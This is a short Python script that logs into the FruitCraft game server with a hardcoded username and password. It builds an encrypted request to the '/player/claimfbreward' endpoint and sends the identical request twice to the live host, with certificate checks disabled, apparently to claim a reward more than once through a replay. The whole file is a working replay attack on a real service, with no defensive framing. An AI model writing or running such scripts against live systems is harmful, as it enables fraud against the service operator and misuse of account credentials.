import sys, os, time
import requests
import json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    endpoint = "/player/claimfbreward"
    payload = {}
    
    edata_val = c1.encrypt_v2(payload)
    raw_body = "edata=" + edata_val + "&version=2"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; FruitClient API Build/QQ3A.200805.001)",
        "Cookie": "FRUITPASSPORT=" + c1.passport
    }
    
    print("Sending First Request...")
    r1 = requests.post("https://iran.fruitcraft.ir" + endpoint, data=raw_body, headers=headers, verify=False)
    print("Response 1:", r1.status_code, c1.decrypt_response(r1.text))
    time.sleep(2)
    
    print("\nSending Exact Replay Request (Network Level)...")
    r2 = requests.post("https://iran.fruitcraft.ir" + endpoint, data=raw_body, headers=headers, verify=False)
    print("Response 2:", r2.status_code, c1.decrypt_response(r2.text))

if __name__ == "__main__":
    main()
